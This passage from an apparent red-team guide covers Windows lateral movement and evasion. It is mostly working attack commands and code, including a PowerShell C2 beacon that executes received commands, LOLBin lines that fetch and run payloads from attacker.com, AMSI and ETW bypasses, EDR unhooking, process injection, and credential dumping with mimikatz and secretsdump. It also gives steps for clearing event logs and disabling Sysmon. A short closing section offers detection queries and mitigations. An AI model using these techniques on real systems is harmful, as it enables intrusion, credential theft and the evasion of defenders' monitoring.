(Empire: credential_injection) > set NewCred DOMAIN\user:password
(Empire: credential_injection) > execute

# Use stored credentials
(Empire) > creds

# PTH with Empire
(Empire) > usemodule credentials/mimikatz/pth
(Empire: pth) > set user Administrator
(Empire: pth) > set domain CORP
(Empire: pth) > set ntlm NTLM_HASH
(Empire: pth) > execute
```

---

### Metasploit Framework

#### PsExec Modules

```ruby
# PsExec
msf6> use exploit/windows/smb/psexec
msf6 exploit(psexec) > set RHOSTS 192.168.1.100
msf6 exploit(psexec) > set SMBUser Administrator
msf6 exploit(psexec) > set SMBPass Password123
msf6 exploit(psexec) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(psexec) > exploit

# PsExec with hash
msf6 exploit(psexec) > set SMBUser Administrator
msf6 exploit(psexec) > set SMBPass 00000000000000000000000000000000:NTLM_HASH
msf6 exploit(psexec) > exploit

# PsExec (native upload)
msf6> use exploit/windows/smb/psexec_psh
```

#### WMI Module

```ruby
msf6> use exploit/windows/local/wmi
msf6 exploit(wmi) > set RHOSTS 192.168.1.100
msf6 exploit(wmi) > set SMBUser Administrator
msf6 exploit(wmi) > set SMBPass Password123
msf6 exploit(wmi) > exploit
```

#### WinRM Module

```ruby
msf6> use exploit/windows/winrm/winrm_script_exec
msf6 exploit(winrm_script_exec) > set RHOSTS 192.168.1.100
msf6 exploit(winrm_script_exec) > set USERNAME Administrator
msf6 exploit(winrm_script_exec) > set PASSWORD Password123
msf6 exploit(winrm_script_exec) > set FORCE_VBS true
msf6 exploit(winrm_script_exec) > exploit
```

#### Post-Exploitation Lateral Movement

```ruby
# From meterpreter session
meterpreter> run post/windows/gather/credentials/credential_collector

# Token impersonation
meterpreter> load incognito
meterpreter> list_tokens -u
meterpreter> impersonate_token "DOMAIN\\Administrator"

# Pass-the-Hash
meterpreter> load kiwi
meterpreter> creds_all
meterpreter> kerberos
```

---

### Sliver C2

#### Lateral Movement

```
# Generate implant
sliver> generate --mtls 192.168.1.200:443 --os windows --arch amd64 --format exe --save /tmp/implant.exe

# PsExec-like execution
sliver (SESSION_NAME) > psexec -d "implant description" -p /tmp/implant.exe -u DOMAIN\user -P password -h TARGET-PC

# WMI execution
sliver (SESSION_NAME) > wmi -p /tmp/implant.exe -u DOMAIN\user -P password -h TARGET-PC

# Upload and execute
sliver (SESSION_NAME) > upload /tmp/implant.exe C:\\Temp\\update.exe
sliver (SESSION_NAME) > execute C:\\Temp\\update.exe
```

#### Pivoting

```
# Start SOCKS proxy
sliver (SESSION_NAME) > socks5 start

# Port forwarding
sliver (SESSION_NAME) > portfwd add --bind 0.0.0.0:8080 --remote 192.168.1.100:80

# Reverse port forward
sliver (SESSION_NAME) > rportfwd add --bind 0.0.0.0:4444 --remote 127.0.0.1:4444
```

---

### Havoc Framework

#### Agent Deployment

```
# Generate payload
Havoc> payload generate --arch x64 --format exe --out implant.exe

# Deploy via SMB
Havoc (DEMON_ID) > smb_upload C:\Windows\Temp\implant.exe implant.exe
Havoc (DEMON_ID) > smb_exec implant.exe
```

#### Lateral Movement Modules

```
# WMI execution
Havoc (DEMON_ID) > wmi_exec TARGET-PC "C:\Windows\Temp\implant.exe"

# Service creation
Havoc (DEMON_ID) > service_create TARGET-PC ServiceName "C:\Windows\Temp\implant.exe"
Havoc (DEMON_ID) > service_start TARGET-PC ServiceName
```

---

### Custom C2 Lateral Movement

#### Design Considerations

1. **Communication Channels**
   - HTTP/HTTPS (common, blends in)
   - DNS (stealthy, slow)
   - SMB Named Pipes (local network)
   - TCP/UDP (direct, fast)

2. **Execution Methods**
   - In-memory execution (no disk artifacts)
   - Process injection (living off the land)
   - Service creation (persistence)
   - Scheduled tasks (delayed execution)

3. **Credential Management**
   - Secure storage of credentials/hashes
   - PTH/PTT integration
   - Credential reuse across targets

4. **OpSec Features**
   - Jitter and sleep timers
   - Domain fronting
   - Encrypted C2 traffic
   - Beacon randomization
   - Process masquerading

#### Example: Minimal C2 Lateral Movement

```python
# server.py - C2 Server
from flask import Flask, request
import base64

app = Flask(__name__)

@app.route('/beacon', methods=['POST'])
def beacon():
    data = request.json
    print(f"[+] Beacon from {data['hostname']}")
    # Command dispatch logic
    return {"command": "whoami"}

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=443, ssl_context='adhoc')
```

```powershell
# client.ps1 - Minimal Beacon
while ($true) {
    $hostname = $env:COMPUTERNAME
    $body = @{hostname=$hostname} | ConvertTo-Json
    $response = Invoke-RestMethod -Uri "https://192.168.1.200/beacon" -Method POST -Body $body -ContentType "application/json"
    $output = Invoke-Expression $response.command
    Start-Sleep -Seconds 60
}
```

**Lateral Movement Integration**:
```powershell
# Deploy beacon to remote system via WMI
$beacon = Get-Content -Raw beacon.ps1
$encodedBeacon = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($beacon))
$command = "powershell.exe -enc $encodedBeacon"

Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $command -ComputerName TARGET-PC -Credential $cred
```

---

## Stealth & Evasion

### Living Off the Land Binaries (LOLBins)

**MITRE ATT&CK**: T1218 (System Binary Proxy Execution)

**Concept**: Use legitimate Windows binaries for malicious purposes to evade detection.

#### Common LOLBins for Lateral Movement

**Rundll32.exe**
```powershell
# Execute DLL function
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\temp\lsass.dmp full

# Execute JavaScript/VBScript
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -enc <base64>")

# Remote DLL execution
rundll32.exe \\TARGET-PC\share\malicious.dll,EntryPoint
```

**Regsvr32.exe**
```powershell
# Scriptlet execution (bypass AppLocker)
regsvr32.exe /s /n /u /i:http://attacker.com/payload.sct scrobj.dll

# Local SCT file
regsvr32.exe /s /u /i:payload.sct scrobj.dll
```

**Mshta.exe**
```powershell
# HTA execution from URL
mshta.exe http://attacker.com/payload.hta

# Inline JavaScript
mshta.exe javascript:close(new ActiveXObject("WScript.Shell").Run("powershell -enc <base64>"))

# VBScript execution
mshta.exe vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -enc <base64>"":Close")
```

**Certutil.exe**
```powershell
# Download file
certutil.exe -urlcache -f http://attacker.com/payload.exe C:\temp\payload.exe

# Decode base64
certutil.exe -decode encoded.txt decoded.exe

# Download and execute
certutil.exe -urlcache -f http://attacker.com/beacon.exe C:\temp\beacon.exe && C:\temp\beacon.exe
```

**Bitsadmin.exe**
```powershell
# Download file
bitsadmin.exe /transfer job /download /priority high http://attacker.com/payload.exe C:\temp\payload.exe

# Execute after download
bitsadmin.exe /transfer job /download /priority high http://attacker.com/beacon.exe C:\temp\beacon.exe && C:\temp\beacon.exe
```

**Wmic.exe**
```powershell
# Execute local XSL
wmic.exe process get brief /format:"C:\temp\payload.xsl"

# Execute remote XSL (downloads and executes)
wmic.exe process get brief /format:"http://attacker.com/payload.xsl"

# Remote command execution (lateral movement)
wmic.exe /node:TARGET-PC process call create "cmd.exe /c powershell -enc <base64>"
```

**Msiexec.exe**
```powershell
# Install MSI from URL
msiexec.exe /i http://attacker.com/payload.msi /quiet

# Install MSI from network share
msiexec.exe /i \\attacker\share\payload.msi /quiet

# Repair mode (can execute DLL)
msiexec.exe /y malicious.dll
```

---

### AV/EDR Evasion

**MITRE ATT&CK**: T1562.001 (Impair Defenses: Disable or Modify Tools)

#### Process Injection Techniques

**CreateRemoteThread**
```cpp
// Classic injection (well-detected)
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
LPVOID pRemoteBuffer = VirtualAllocEx(hProcess, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, pRemoteBuffer, payload, payloadSize, NULL);
HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBuffer, NULL, 0, NULL);
```

**Process Hollowing**
```powershell
# Start legitimate process in suspended state
# Unmap legitimate code
# Write malicious code
# Resume process
# Common target: svchost.exe, explorer.exe
```

**APC Queue Injection**
```cpp
// Queue APC to existing thread
QueueUserAPC((PAPCFUNC)pRemoteBuffer, hThread, NULL);
// Thread executes payload when in alertable state
```

**Thread Execution Hijacking**
```cpp
// Suspend thread
// Modify RIP/EIP to point to shellcode
// Resume thread
```

**Process Doppelgänging** (Windows 10+)
```
1. Create transaction
2. Write malicious file to transaction
3. Create section from transacted file
4. Rollback transaction (file disappears)
5. Create process from section
```

#### Direct Syscalls

**Concept**: Bypass usermode hooks by directly invoking syscalls.

```nasm
; Example: NtAllocateVirtualMemory direct syscall
mov r10, rcx
mov eax, 0x18  ; Syscall number (version-specific)
syscall
ret
```

**Tools**:
- **SysWhispers2**: Generate syscall stubs
- **Hells Gate**: Dynamically resolve syscall numbers
- **InlineWhispers**: Inline syscalls in C/C++

```c
// SysWhispers2 usage
#include "syscalls.h"

NTSTATUS status = NtAllocateVirtualMemory(
    hProcess,
    &baseAddress,
    0,
    &regionSize,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_EXECUTE_READWRITE
);
```

#### API Unhooking

**Concept**: Remove EDR hooks from Windows APIs to evade monitoring.

```cpp
// Read clean NTDLL from disk
HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
HANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
LPVOID pMapping = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);

// Find .text section
PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pMapping;
PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)pMapping + pDosHeader->e_lfanew);
PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);

// Copy clean .text section over hooked version
LPVOID ntdllBase = GetModuleHandleA("ntdll.dll");
memcpy((LPVOID)((BYTE*)ntdllBase + pSectionHeader->VirtualAddress),
       (LPVOID)((BYTE*)pMapping + pSectionHeader->VirtualAddress),
       pSectionHeader->Misc.VirtualSize);
```

#### AMSI Bypass

```powershell
# Disable AMSI (PowerShell)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Memory patch method
$a=[Ref].Assembly.GetTypes();Foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d){if($e.Name -like "*Context"){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)

# Obfuscated AMSI bypass (evades detection)
$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
$field.SetValue($null,$true)
```

#### ETW Bypass

```cpp
// Patch EtwEventWrite to return immediately
unsigned char patch[] = { 0xC3 }; // RET instruction
DWORD oldProtect;
VirtualProtect(EtwEventWrite, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);
memcpy(EtwEventWrite, patch, sizeof(patch));
VirtualProtect(EtwEventWrite, sizeof(patch), oldProtect, &oldProtect);
```

---

### Network-Level Evasion

#### SMB Signing Bypass

**Note**: Cannot truly "bypass" when required, but can target systems without enforcement.

```bash
# Check SMB signing status
crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt

# Target systems without signing for relay attacks
```

#### Channel Encryption

```powershell
# Enable SMB encryption
Set-SmbServerConfiguration -EncryptData $true -Force

# Check encryption status
Get-SmbConnection | Select ServerName,Dialect,Encrypted
```

#### Protocol Downgrade Attacks

```powershell
# Force SMBv1 (if enabled on target)
# Older, less secure protocol
net use \\TARGET-PC\C$ /version:1.0

# Kerberos to NTLM downgrade
# Access by IP (forces NTLM)
\\192.168.1.100\C$
```

---

### Log Evasion

#### Event Log Clearing

```powershell
# Clear all event logs (LOUD)
wevtutil el | ForEach-Object {wevtutil cl "$_"}

# Clear specific log
wevtutil cl Security
wevtutil cl System
wevtutil cl "Microsoft-Windows-Sysmon/Operational"

# Alternative: PowerShell
Clear-EventLog -LogName Security
Clear-EventLog -LogName System

# Selective log deletion (less obvious)
# Remove specific event IDs related to your activity
wevtutil qe Security /q:"*[System[(EventID=4624)]]" /f:text /rd:true /c:10
```

**Detection**: Event ID 1102 (Security log cleared), Event ID 104 (System log cleared)

#### Event Filter Bypass

```powershell
# Disable logging temporarily
auditpol /set /category:"Logon/Logoff" /success:disable /failure:disable

# Re-enable after activity
auditpol /set /category:"Logon/Logoff" /success:enable /failure:enable
```

#### Minimal Footprint Techniques

1. **Fileless Execution**
   ```powershell
   # PowerShell in-memory execution
   IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')

   # In-memory PE loading
   Invoke-ReflectivePEInjection -PEBytes $bytes
   ```

2. **Disable PowerShell Logging**
   ```powershell
   # Script Block Logging
   Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0

   # Module Logging
   Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name "EnableModuleLogging" -Value 0

   # Transcription
   Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "EnableTranscripting" -Value 0
   ```

3. **Sysmon Evasion**
   ```powershell
   # Identify Sysmon driver
   fltmc | findstr /i sysmon

   # Unload Sysmon (requires admin)
   fltmc unload SysmonDrv

   # Alternative: Disable Sysmon service
   sc stop Sysmon64
   sc config Sysmon64 start= disabled
   ```

---

### Timestomping and Anti-Forensics

**MITRE ATT&CK**: T1070.006 (Indicator Removal: Timestomp)

#### Modify File Timestamps

```powershell
# PowerShell timestomping
$file = Get-Item C:\temp\malicious.exe
$file.CreationTime = "01/01/2020 12:00:00"
$file.LastAccessTime = "01/01/2020 12:00:00"
$file.LastWriteTime = "01/01/2020 12:00:00"

# Copy timestamps from legitimate file
$legit = Get-Item C:\Windows\System32\calc.exe
$malicious = Get-Item C:\temp\payload.exe
$malicious.CreationTime = $legit.CreationTime
$malicious.LastAccessTime = $legit.LastAccessTime
$malicious.LastWriteTime = $legit.LastWriteTime
```

#### Timestomping Tools

```bash
# Metasploit
meterpreter> timestomp C:\\temp\\payload.exe -m "01/01/2020 12:00:00"

# NTFS $STANDARD_INFORMATION modification
# Use SetMACE or similar tools
```

#### Secure File Deletion

```powershell
# Overwrite and delete
function Secure-Delete {
    param($FilePath)
    $file = [System.IO.File]::OpenWrite($FilePath)
    $random = New-Object byte[] $file.Length
    (New-Object Random).NextBytes($random)
    $file.Write($random, 0, $random.Length)
    $file.Close()
    Remove-Item $FilePath -Force
}

Secure-Delete C:\temp\sensitive.txt
```

#### Registry Artifact Removal

```powershell
# Remove recently opened files
Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" -Recurse -Force

# Remove RunMRU (Run dialog history)
Remove-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force

# Remove typed paths
Remove-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths" -Name "*" -Force
```

---

## Tools Reference

### CrackMapExec (NetExec)

**Installation**:
```bash
pipx install crackmapexec
# or
apt install crackmapexec
```

**Usage Examples**:

```bash
# Authentication spray
crackmapexec smb 192.168.1.0/24 -u user -p password

# Pass-the-Hash
crackmapexec smb 192.168.1.0/24 -u Administrator -H NTHASH

# Execute command
crackmapexec smb 192.168.1.100 -u user -p password -x "whoami"

# PowerShell execution
crackmapexec smb 192.168.1.100 -u user -p password -X 'Get-Process'

# Dump SAM
crackmapexec smb 192.168.1.100 -u user -p password --sam

# Dump LSA
crackmapexec smb 192.168.1.100 -u user -p password --lsa

# Dump NTDS (DC)
crackmapexec smb 192.168.1.10 -u user -p password --ntds

# Enumerate shares
crackmapexec smb 192.168.1.0/24 -u user -p password --shares

# Spider shares (find sensitive files)
crackmapexec smb 192.168.1.100 -u user -p password -M spider_plus

# Enumerate logged-on users
crackmapexec smb 192.168.1.0/24 -u user -p password --users

# Check local admin access
crackmapexec smb 192.168.1.0/24 -u user -p password --local-auth

# WinRM
crackmapexec winrm 192.168.1.100 -u user -p password -x "whoami"

# MSSQL
crackmapexec mssql 192.168.1.100 -u sa -p password -x "xp_cmdshell whoami"
```

**Modules**:
```bash
# List modules
crackmapexec smb -L

# Use module
crackmapexec smb 192.168.1.100 -u user -p password -M module_name

# Common modules:
# - mimikatz: Dump credentials
# - lsassy: LSASS dumping
# - nanodump: Stealthy LSASS dump
# - procdump: Sysinternals procdump
# - spider_plus: File hunting
```

**Download**: https://github.com/byt3bl33d3r/CrackMapExec

---

### Impacket Suite

**Installation**:
```bash
git clone https://github.com/fortra/impacket.git
cd impacket
pip install .
```

**Key Tools**:

**psexec.py**
```bash
psexec.py DOMAIN/user:password@192.168.1.100
psexec.py -hashes :NTHASH DOMAIN/user@192.168.1.100
```

**wmiexec.py**
```bash
wmiexec.py DOMAIN/user:password@192.168.1.100
wmiexec.py -hashes :NTHASH DOMAIN/user@192.168.1.100
```

**smbexec.py**
```bash
smbexec.py DOMAIN/user:password@192.168.1.100
smbexec.py -hashes :NTHASH DOMAIN/user@192.168.1.100
```

**dcomexec.py**
```bash
dcomexec.py DOMAIN/user:password@192.168.1.100
dcomexec.py -hashes :NTHASH DOMAIN/user@192.168.1.100
```

**atexec.py**
```bash
atexec.py DOMAIN/user:password@192.168.1.100 "whoami"
atexec.py -hashes :NTHASH DOMAIN/user@192.168.1.100 "ipconfig"
```

**secretsdump.py**
```bash
# Local SAM
secretsdump.py -sam sam.hive -security security.hive -system system.hive LOCAL

# Remote
secretsdump.py DOMAIN/user:password@192.168.1.100

# DC (full NTDS)
secretsdump.py DOMAIN/user:password@DC-IP -just-dc

# Specific user
secretsdump.py DOMAIN/user:password@DC-IP -just-dc-user Administrator
```

**getTGT.py**
```bash
getTGT.py DOMAIN/user:password
getTGT.py DOMAIN/user -hashes :NTHASH
export KRB5CCNAME=user.ccache
```

**getST.py**
```bash
getST.py -spn cifs/target.corp.local DOMAIN/user -hashes :NTHASH
export KRB5CCNAME=user.ccache
```

**Download**: https://github.com/fortra/impacket

---

### Rubeus

**Compilation**:
```powershell
# Requires Visual Studio or .NET SDK
git clone https://github.com/GhostPack/Rubeus.git
cd Rubeus
dotnet build
# or use pre-compiled releases
```

**Usage**:

```powershell
# Dump tickets
Rubeus.exe dump

# Monitor for new tickets
Rubeus.exe monitor /interval:5

# Request TGT
Rubeus.exe asktgt /user:Administrator /rc4:NTHASH /ptt

# Request TGT with AES
Rubeus.exe asktgt /user:Administrator /aes256:AESKEY /ptt

# Pass-the-Ticket
Rubeus.exe ptt /ticket:BASE64_TICKET

# Kerberoast
Rubeus.exe kerberoast /outfile:kerberoast.txt

# ASREPRoast
Rubeus.exe asreproast /outfile:asreproast.txt

# Golden Ticket
Rubeus.exe golden /rc4:KRBTGT_HASH /domain:corp.local /sid:S-1-5-21-... /user:Administrator /ptt

# Silver Ticket
Rubeus.exe silver /service:cifs/server.corp.local /rc4:SERVICE_HASH /user:Administrator /domain:corp.local /ptt

# Create sacrificial logon
Rubeus.exe createnetonly /program:cmd.exe /domain:CORP /username:user /password:FakePass /ticket:BASE64
```

**Download**: https://github.com/GhostPack/Rubeus

---

### Mimikatz

**Usage**:

```powershell
# Basic credential dump
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Export tickets
mimikatz.exe "sekurlsa::tickets /export" "exit"

# Pass-the-Hash
mimikatz.exe "sekurlsa::pth /user:Administrator /domain:CORP /ntlm:NTHASH /run:cmd.exe" "exit"

# Pass-the-Ticket
mimikatz.exe "kerberos::ptt ticket.kirbi" "exit"

# Golden Ticket
mimikatz.exe "kerberos::golden /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /user:Administrator /ptt" "exit"

# DCSync
mimikatz.exe "lsadump::dcsync /domain:corp.local /user:Administrator" "exit"

# DPAPI
mimikatz.exe "sekurlsa::dpapi" "exit"

# LSA Secrets
mimikatz.exe "lsadump::secrets" "exit"

# SAM dump
mimikatz.exe "lsadump::sam" "exit"
```

**Download**: https://github.com/gentilkiwi/mimikatz

---

### PowerView / PowerSploit

**Loading**:
```powershell
# Download and execute in memory
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/PowerView.ps1')

# Load from file
. .\PowerView.ps1
```

**Common Commands**:

```powershell
# Domain enumeration
Get-Domain
Get-DomainController
Get-DomainUser
Get-DomainComputer
Get-DomainGroup

# Find local admin access
Find-LocalAdminAccess
Invoke-UserHunter

# Find shares
Find-DomainShare
Find-InterestingDomainShareFile

# ACL enumeration
Get-ObjectAcl -SamAccountName "Domain Admins"
Find-InterestingDomainAcl

# GPO enumeration
Get-DomainGPO
Get-DomainGPOLocalGroup

# Session enumeration
Get-NetSession -ComputerName DC01
Get-NetLoggedon -ComputerName DC01

# Execution
Invoke-Command -ComputerName TARGET-PC -ScriptBlock { whoami }
```

**Download**: https://github.com/PowerShellMafia/PowerSploit

---

### SharpMove / SharpCollection

**SharpMove** (Lateral Movement toolkit):
```powershell
# WMI execution
SharpMove.exe wmi /target:TARGET-PC /command:"cmd.exe"

# WinRM
SharpMove.exe winrm /target:TARGET-PC /command:"whoami"

# DCOM
SharpMove.exe dcom /target:TARGET-PC /method:MMC20
```

**SharpCollection** (Collection of C# offensive tools):
- SharpDPAPI: DPAPI credential extraction
- SharpChrome: Chrome credential dumping
- Seatbelt: System enumeration
- SharpUp: Privilege escalation checks
- SharpHound: BloodHound data collector

**Download**:
- SharpMove: https://github.com/0xthirteen/SharpMove
- SharpCollection: https://github.com/Flangvik/SharpCollection

---

## Detection and Defense

### Blue Team Detection Strategies

#### Network-Level Detection

**SMB Anomalies**:
- Monitor Event ID 5140/5145: Network share access
- Unusual admin share access (ADMIN$, C$, IPC$)
- SMB connections from workstations to workstations (lateral movement)
- Disabled SMB signing usage

**Authentication Anomalies**:
- Event ID 4624: Multiple logon types from single source
- Event ID 4625: Failed logon attempts followed by success
- Event ID 4648: Explicit credential usage (RunAs, PsExec)
- Logon type patterns:
  - Type 3 (Network): Normal for file shares
  - Type 10 (RemoteInteractive): RDP
  - Type 3 from workstation to workstation: Suspicious

**Kerberos Anomalies**:
- Event ID 4768: TGT requests with unusual encryption (RC4 downgrade)
- Event ID 4769: Service ticket requests for unusual SPNs
- Ticket request patterns indicating Kerberoasting
- Golden Ticket indicators: Abnormal ticket lifetimes, unusual encryption

#### Host-Level Detection

**Process Anomalies**:
- Sysmon Event ID 1: Unusual parent-child relationships
  - cmd.exe spawned by WmiPrvSE.exe
  - powershell.exe spawned by services.exe
  - Suspicious processes from wsmprovhost.exe
- Service creation (Event ID 7045) with unusual service names
- Process injection indicators (Sysmon Event ID 8)

**File System Anomalies**:
- Creation of .dmp files outside normal locations
- Executables in ADMIN$ share
- Unusual file access patterns (Sysmon Event ID 11)
- DPAPI blob access from unexpected processes

**Registry Anomalies**:
- Sysmon Event ID 13: Service creation registry keys
- DisableRestrictedAdmin value changes
- Security provider modifications

#### Behavioral Analytics

**User Behavior**:
- Account used from multiple systems simultaneously
- Account accessing systems outside normal pattern
- Privilege escalation patterns (standard → admin)
- Access to systems user doesn't normally access

**Time-Based Anomalies**:
- Authentication outside business hours
- Rapid lateral movement across multiple systems
- Short-lived services or scheduled tasks

### SIEM Queries and Rules

**Splunk**:
```spl
# Detect PsExec usage
index=windows EventCode=7045 Service_Name="PSEXE*"

# Lateral movement via WMI
index=windows EventCode=4688 Parent_Process_Name="*WmiPrvSE.exe" Process_Name IN ("cmd.exe", "powershell.exe")

# RDP session hijacking
index=windows EventCode=4778 OR EventCode=4779 | transaction Session_ID | where mvcount(Account_Name) > 1

# Pass-the-Hash indicators
index=windows EventCode=4624 Logon_Type=3 Authentication_Package=NTLM | stats count by Source_Network_Address, Account_Name | where count > 10
```

**Elastic/EQL**:
```eql
// WMI lateral movement
sequence by user.name with maxspan=1m
  [authentication where event.action == "logged-in" and winlog.logon.type == "Network"]
  [process where process.parent.name == "WmiPrvSE.exe" and process.name in ("cmd.exe", "powershell.exe")]

// Service-based lateral movement
sequence by host.name with maxspan=5m
  [registry where registry.path : "*\\Services\\*\\Start"]
  [process where process.parent.name == "services.exe"]
```

### Mitigation Recommendations

1. **Enable SMB Signing** (required on all systems)
2. **Disable NTLM** (use Kerberos only where possible)
3. **LAPS** (Local Administrator Password Solution) for unique local admin passwords
4. **Tiered Administration Model** (separate admin accounts for different privilege levels)
5. **Protected Users Group** (prevents credential delegation, NTLM usage)
6. **Credential Guard** (virtualization-based security for credentials)
7. **Attack Surface Reduction** (disable WMI, PowerShell remoting where not needed)
8. **Application Whitelisting** (AppLocker, WDAC)
9. **EDR Deployment** (endpoint detection and response)
10. **Network Segmentation** (limit lateral movement paths)

---

## References and Resources

### Official Documentation
- Microsoft: https://docs.microsoft.com/en-us/windows-server/security/
- MITRE ATT&CK: https://attack.mitre.org/
- NIST Cybersecurity Framework: https://www.nist.gov/cyberframework

### Tools and Frameworks
- Impacket: https://github.com/fortra/impacket
- CrackMapExec: https://github.com/byt3bl33d3r/CrackMapExec
- Rubeus: https://github.com/GhostPack/Rubeus
- Mimikatz: https://github.com/gentilkiwi/mimikatz
- PowerSploit: https://github.com/PowerShellMafia/PowerSploit
- BloodHound: https://github.com/BloodHoundAD/BloodHound

### Learning Resources
- Active Directory Security Blog: https://adsecurity.org/
- Harmj0y Blog: https://blog.harmj0y.net/
- SpecterOps Blog: https://posts.specterops.io/
- Red Team Notes: https://www.ired.team/
- HackTricks: https://book.hacktricks.xyz/windows/active-directory-methodology

### Training and Certifications
- CRTO (Certified Red Team Operator): https://www.zeropointsecurity.co.uk/red-team-ops
- CRTP (Certified Red Team Professional): https://www.pentesteracademy.com/activedirectorylab
- OSEP (Offensive Security Experienced Penetration Tester): https://www.offensive-security.com/pen300-osep/
- GXPN (GIAC Exploit Researcher and Advanced Penetration Tester): https://www.giac.org/certification/exploit-researcher-advanced-penetration-tester-gxpn

### Books
- "Active Directory Security: The Essential Guide" by Jeremy Moskowitz
- "Advanced Penetration Testing" by Wil Allsopp
- "The Hacker Playbook 3" by Peter Kim
- "Operator Handbook: Red Team + OSINT + Blue Team Reference" by Joshua Picolet

---

**Disclaimer**: This guide is for authorized security testing and educational purposes only. Unauthorized access to computer systems is illegal. Always obtain proper authorization before conducting security assessments.

**Last Updated**: 2025-01-09
**Version**: 1.0
**Author**: Zemarkhos
